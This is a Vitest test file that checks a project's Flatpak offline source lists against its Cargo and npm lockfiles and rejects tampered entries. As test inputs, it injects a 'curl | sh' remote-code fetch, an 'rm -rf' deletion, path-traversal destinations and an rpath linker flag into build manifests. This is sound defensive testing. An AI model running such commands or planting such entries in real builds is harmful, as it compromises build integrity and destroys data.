// @vitest-environment node
// The offline source lists against the lockfiles (011 US3-2, 011 FR-015,
// 011 SC-004; 011 data-model.md "Offline source lists"). `npm test` runs it, so
// a lockfile change without `npm run flatpak:sources` fails every test run, not
// only the Flatpak build. It needs no Python and no network. The comparison is
// `sources.mjs`; the fixtures under `fixtures/sources-*/` are tiny lockfiles
// and lists, each wrong in one way.
import crypto from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { checkCargoSources, checkNodeSources, checkSources, parseCargoLock } from "./sources.mjs";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(HERE, "../..");

const sha256 = (s: string) => crypto.createHash("sha256").update(s).digest("hex");
const sha512hex = (s: string) => crypto.createHash("sha512").update(s).digest("hex");

function fixture(name: string) {
  const dir = path.join(HERE, "fixtures", `sources-${name}`);
  return {
    cargoLockPath: path.join(dir, "Cargo.lock"),
    packageLockPath: path.join(dir, "package-lock.json"),
    cargoSourcesPath: path.join(dir, "cargo-sources.json"),
    nodeSourcesPath: path.join(dir, "node-sources.json"),
  };
}
const cargo = (name: string) => {
  const f = fixture(name);
  return checkCargoSources({ cargoLockPath: f.cargoLockPath, sourcesPath: f.cargoSourcesPath });
};
const node = (name: string) => {
  const f = fixture(name);
  return checkNodeSources({ packageLockPath: f.packageLockPath, sourcesPath: f.nodeSourcesPath });
};

const REGENERATE = "Run `npm run flatpak:sources` in the dev container and commit both lists.";
/** A list entry, as the generators write it. */
type Entry = Record<string, unknown>;

/** The `ok` fixture with one of its lists changed by `change`, checked. */
function changed(list: "cargo" | "node", change: (entries: Entry[]) => void) {
  const f = fixture("ok");
  const original = list === "cargo" ? f.cargoSourcesPath : f.nodeSourcesPath;
  const entries = JSON.parse(fs.readFileSync(original, "utf8")) as Entry[];
  change(entries);
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "hoplodex-sources-"));
  try {
    const sourcesPath = path.join(dir, path.basename(original));
    fs.writeFileSync(sourcesPath, JSON.stringify(entries));
    return list === "cargo"
      ? checkCargoSources({ cargoLockPath: f.cargoLockPath, sourcesPath })
      : checkNodeSources({ packageLockPath: f.packageLockPath, sourcesPath });
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}
const find = (entries: Entry[], match: (e: Entry) => boolean) => {
  const entry = entries.find(match);
  if (!entry) throw new Error("the ok fixture has no such entry");
  return entry;
};

const CARGO = "flatpak/cargo-sources.json does not match src-tauri/Cargo.lock";
const NODE = "flatpak/node-sources.json does not match package-lock.json";

describe("011 US3-2 - the offline source lists match the lockfiles", () => {
  it("011 US3-2: the real lockfiles against the real lists (red until the lists are generated)", () => {
    expect(
      checkSources({
        cargoLockPath: path.join(ROOT, "src-tauri/Cargo.lock"),
        packageLockPath: path.join(ROOT, "package-lock.json"),
        cargoSourcesPath: path.join(ROOT, "flatpak/cargo-sources.json"),
        nodeSourcesPath: path.join(ROOT, "flatpak/node-sources.json"),
      }),
    ).toEqual([]);
  });

  it("reads a Cargo.lock's packages", () => {
    expect(
      parseCargoLock(
        [
          "version = 4",
          "",
          "[[package]]",
          'name = "app"',
          'version = "0.1.0"',
          "dependencies = [",
          ' "foo",',
          "]",
          "",
          "[[package]]",
          'name = "foo"',
          'version = "1.2.3"',
          'source = "registry+https://github.com/rust-lang/crates.io-index"',
          'checksum = "abc"',
          "",
          "[metadata]",
          'name = "not a package"',
        ].join("\n"),
      ),
    ).toEqual([
      { name: "app", version: "0.1.0" },
      {
        name: "foo",
        version: "1.2.3",
        source: "registry+https://github.com/rust-lang/crates.io-index",
        checksum: "abc",
      },
    ]);
  });

  describe("a list that covers its lockfile exactly", () => {
    it("passes, the generators' inline, script and shell entries and a link entry included", () => {
      expect(checkSources(fixture("ok"))).toEqual([]);
    });
  });

  describe("Cargo.lock: for each registry package, exactly one archive with its url and sha256", () => {
    it("names the list, the crate and the command for a version bump", () => {
      expect(cargo("cargo-version-bump")).toBe(
        `${CARGO}: crate foo is at 1.2.4 in src-tauri/Cargo.lock, but the list has 1.2.3. ${REGENERATE}`,
      );
    });

    it("names both checksums for a changed checksum", () => {
      expect(cargo("cargo-checksum")).toBe(
        `${CARGO}: crate bar 0.4.0 has sha256 ${sha256("bar-0.4.0")} in the list ` +
          `but ${sha256("bar-changed")} in src-tauri/Cargo.lock. ${REGENERATE}`,
      );
    });

    it("names a crate with no source", () => {
      expect(cargo("cargo-missing")).toBe(`${CARGO}: crate bar 0.4.0 has no source. ${REGENERATE}`);
    });

    it("names a crate with two sources", () => {
      expect(cargo("cargo-duplicate")).toBe(
        `${CARGO}: crate bar 0.4.0 has 2 sources, not one. ${REGENERATE}`,
      );
    });
  });

  describe("package-lock.json: for each package with resolved and integrity, exactly one source with its url and hash", () => {
    it("names the list, the package and the command for a version bump", () => {
      expect(node("node-version-bump")).toBe(
        `${NODE}: npm package left-pad@1.3.1 (https://registry.npmjs.org/left-pad/-/left-pad-1.3.1.tgz) ` +
          `has no source. ${REGENERATE}`,
      );
    });

    it("names both hashes for a changed integrity", () => {
      expect(node("node-integrity")).toBe(
        `${NODE}: npm package @scope/pkg@2.0.0 has sha512 hash ${sha512hex("@scope/pkg-2.0.0")} in the list ` +
          `but ${sha512hex("@scope/pkg-changed")} in package-lock.json. ${REGENERATE}`,
      );
    });

    it("names a package with no source", () => {
      expect(node("node-missing")).toBe(
        `${NODE}: npm package @scope/pkg@2.0.0 (https://registry.npmjs.org/@scope/pkg/-/pkg-2.0.0.tgz) ` +
          `has no source. ${REGENERATE}`,
      );
    });

    it("names a package with two sources", () => {
      expect(node("node-duplicate")).toBe(
        `${NODE}: npm package left-pad@1.3.0 has 2 sources, not one. ${REGENERATE}`,
      );
    });
  });

  describe("no source for a package neither lockfile has", () => {
    it("names a crate Cargo.lock does not have", () => {
      expect(cargo("cargo-extra")).toBe(
        `${CARGO}: the list has a source for crate baz 2.0.0, which src-tauri/Cargo.lock does not have. ${REGENERATE}`,
      );
    });

    it("names the address of a package package-lock.json does not have", () => {
      expect(node("node-extra")).toBe(
        `${NODE}: the list has a source for https://registry.npmjs.org/extra-pkg/-/extra-pkg-9.9.9.tgz, ` +
          `which package-lock.json does not have. ${REGENERATE}`,
      );
    });
  });

  describe("an archive in the node tool cache (011 research.md §3)", () => {
    it("is accepted only as a copy of a package the lockfile has, and any other archive fails", () => {
      // The fixture also holds a copy of left-pad 1.3.0 (same url and hash), which passes.
      expect(node("node-tool-cache-extra")).toBe(
        `${NODE}: the list has a source for https://registry.npmjs.org/extra-pkg/-/extra-pkg-9.9.9.tgz, ` +
          `which package-lock.json does not have. ${REGENERATE}`,
      );
    });

    it("fails an archive with a lockfile package's url but another hash", () => {
      expect(node("node-tool-cache-hash")).toBe(
        `${NODE}: npm package left-pad@1.3.0 has 2 sources, not one. ${REGENERATE}`,
      );
    });
  });

  describe("no git source in Cargo.lock", () => {
    it("names the crate and its source", () => {
      expect(cargo("cargo-git")).toBe(
        "flatpak/cargo-sources.json cannot cover src-tauri/Cargo.lock: crate qux comes from " +
          "git+https://github.com/example/qux?rev=0123456789abcdef#0123456789abcdef0123456789abcdef01234567, " +
          "which the offline Flatpak build cannot fetch (011 research.md §3)",
      );
    });
  });

  it("reports each list that is wrong, and only those", () => {
    expect(checkSources(fixture("cargo-missing"))).toHaveLength(1);
    expect(checkSources(fixture("node-missing"))).toHaveLength(1);
  });
});

// code scanning alert build-ci/cwe-345: an inline, script or shell entry writes
// or runs something in the build directory, where the checkout is, before the
// build; one the pinned generators would not write fails like any other difference.
describe("code scanning alert build-ci/cwe-345 - only the generators' own inline, script and shell entries", () => {
  const stray = (list: string, where: string) =>
    `${list}: the list has ${where} that the generator does not write. ${REGENERATE}`;
  const FOO = "45b593694ffbea195d7d6830f5ea6e6e647d9a109f237e84cbaf40d028caddd4";
  const intoCheckout = {
    type: "inline",
    contents: "fn main() {}",
    dest: "src-tauri/src",
    "dest-filename": "main.rs",
  };

  describe("cargo-sources.json", () => {
    it("accepts a checksum file written with spaces, as the generator's json.dumps writes it", () => {
      expect(
        changed("cargo", (e) => {
          find(e, (x) => x.dest === "cargo/vendor/foo-1.2.3" && x.type === "inline").contents =
            `{"package": "${FOO}", "files": {}}`;
        }),
      ).toBeNull();
    });

    it("refuses an inline entry into the checkout", () => {
      expect(changed("cargo", (e) => e.push(intoCheckout))).toBe(
        stray(CARGO, "an inline source at src-tauri/src/main.rs"),
      );
    });

    it("refuses a crate's checksum file that names files or another checksum", () => {
      const at = "an inline source at cargo/vendor/foo-1.2.3/.cargo-checksum.json";
      const checksum = (e: Entry[]) =>
        find(e, (x) => x.dest === "cargo/vendor/foo-1.2.3" && x.type === "inline");
      expect(
        changed("cargo", (e) => {
          checksum(e).contents = JSON.stringify({ package: FOO, files: { "src/lib.rs": "00" } });
        }),
      ).toBe(stray(CARGO, at));
      expect(
        changed("cargo", (e) => {
          checksum(e).contents = JSON.stringify({ package: sha256("other"), files: {} });
        }),
      ).toBe(stray(CARGO, at));
      expect(
        changed("cargo", (e) => {
          checksum(e).base64 = true;
        }),
      ).toBe(stray(CARGO, at));
    });

    it("refuses a checksum file for a crate Cargo.lock does not have", () => {
      expect(
        changed("cargo", (e) =>
          e.push({
            type: "inline",
            contents: JSON.stringify({ package: FOO, files: {} }),
            dest: "cargo/vendor/evil-1.0.0",
            "dest-filename": ".cargo-checksum.json",
          }),
        ),
      ).toBe(stray(CARGO, "an inline source at cargo/vendor/evil-1.0.0/.cargo-checksum.json"));
    });

    it("refuses another cargo config", () => {
      expect(
        changed("cargo", (e) => {
          const config = find(e, (x) => x["dest-filename"] === "config");
          config.contents = `${String(config.contents)}[build]\nrustflags = ["-C", "link-arg=-Wl,-rpath,/tmp"]\n`;
        }),
      ).toBe(stray(CARGO, "an inline source at cargo/config"));
    });

    it("refuses any script or shell entry", () => {
      expect(changed("cargo", (e) => e.push({ type: "shell", commands: ["true"] }))).toBe(
        stray(CARGO, "a shell source"),
      );
      expect(
        changed("cargo", (e) =>
          e.push({ type: "script", commands: ["true"], dest: "cargo", "dest-filename": "x.sh" }),
        ),
      ).toBe(stray(CARGO, "a script source at cargo/x.sh"));
    });

    it("refuses a crate archive with a key the generator does not write", () => {
      expect(
        changed("cargo", (e) => {
          find(e, (x) => x.type === "archive" && x.dest === "cargo/vendor/foo-1.2.3").path =
            "src-tauri";
        }),
      ).toBe(`${CARGO}: crate foo 1.2.3 unpacks to cargo/vendor/foo-1.2.3. ${REGENERATE}`);
    });

    it("refuses a crate unpacked anywhere but its vendor folder", () => {
      expect(
        changed("cargo", (e) => {
          find(e, (x) => x.type === "archive" && x.dest === "cargo/vendor/foo-1.2.3").dest =
            "src-tauri";
        }),
      ).toBe(`${CARGO}: crate foo 1.2.3 unpacks to src-tauri. ${REGENERATE}`);
    });
  });

  describe("node-sources.json", () => {
    const headers = (e: Entry[]) => find(e, (x) => x.type === "script");
    const esbuild = (e: Entry[]) => find(e, (x) => x.type === "shell" && x.dest !== undefined);

    it("refuses an inline entry into the checkout, or over the headers script", () => {
      expect(changed("node", (e) => e.push(intoCheckout))).toBe(
        stray(NODE, "an inline source at src-tauri/src/main.rs"),
      );
      expect(
        changed("node", (e) =>
          e.push({
            ...intoCheckout,
            dest: "flatpak-node",
            "dest-filename": "setup_sdk_node_headers.sh",
          }),
        ),
      ).toBe(stray(NODE, "an inline source at flatpak-node/setup_sdk_node_headers.sh"));
    });

    it("refuses an npm cache index entry that climbs out of the cache", () => {
      expect(
        changed("node", (e) => {
          find(e, (x) => x.type === "inline").dest =
            "flatpak-node/npm-cache/_cacache/index-v5/../../../src";
        }),
      ).toMatch(
        /^flatpak\/node-sources\.json does not match package-lock\.json: the list has an inline source at flatpak-node\/npm-cache\/_cacache\/index-v5\/\.\.\//,
      );
    });

    it("refuses a headers script with any other command", () => {
      expect(
        changed("node", (e) => {
          (headers(e).commands as string[]).push("curl -s https://example.invalid | sh");
        }),
      ).toBe(stray(NODE, "a script source at flatpak-node/setup_sdk_node_headers.sh"));
    });

    it("refuses a shell entry with any other command", () => {
      expect(
        changed("node", (e) => {
          find(e, (x) => x.type === "shell" && x.dest === undefined).commands = [
            "bash flatpak-node/setup_sdk_node_headers.sh",
            "cp flatpak-node/x src-tauri/src/main.rs",
          ];
        }),
      ).toBe(stray(NODE, "a shell source"));
    });

    it("refuses an esbuild shell entry for a binary the list does not unpack, or for another arch", () => {
      const at = "a shell source at flatpak-node/cache/esbuild";
      expect(
        changed("node", (e) => {
          esbuild(e).commands = (esbuild(e).commands as string[]).map((c) =>
            c.replaceAll("linux-x64@0.25.12", "linux-x64@0.25.13"),
          );
        }),
      ).toBe(stray(NODE, at));
      expect(
        changed("node", (e) => {
          esbuild(e)["only-arches"] = ["aarch64"];
        }),
      ).toBe(stray(NODE, at));
      expect(
        changed("node", (e) => {
          (esbuild(e).commands as string[]).push("rm -rf ../../../src-tauri");
        }),
      ).toBe(stray(NODE, at));
    });

    it("refuses a tool cache copy that climbs out of the cache", () => {
      expect(
        changed("node", (e) => {
          find(e, (x) => x.type === "archive").dest = "flatpak-node/cache/../../src-tauri";
        }),
      ).not.toBeNull();
    });

    it("refuses an esbuild shell entry for a tool cache copy of another package", () => {
      expect(
        changed("node", (e) => {
          const leftPad = find(e, (x) => x.type === "file");
          const archive = find(e, (x) => x.type === "archive");
          archive.url = leftPad.url;
          archive.sha512 = leftPad.sha512;
        }),
      ).toBe(stray(NODE, "a shell source at flatpak-node/cache/esbuild"));
    });

    it("refuses a package's tarball with a key the generator does not write", () => {
      expect(
        changed("node", (e) => {
          find(e, (x) => x.type === "file").path = "src-tauri/src/main.rs";
        }),
      ).toMatch(/npm package left-pad@1\.3\.0 is put at flatpak-node\/npm-cache\//);
    });

    it("refuses a package's tarball put anywhere but the npm cache", () => {
      expect(
        changed("node", (e) => {
          const file = find(e, (x) => x.type === "file");
          file.dest = "src-tauri/src";
          file["dest-filename"] = "main.rs";
        }),
      ).toBe(
        `${NODE}: npm package left-pad@1.3.0 is put at src-tauri/src, not in the npm cache. ${REGENERATE}`,
      );
    });
  });
});
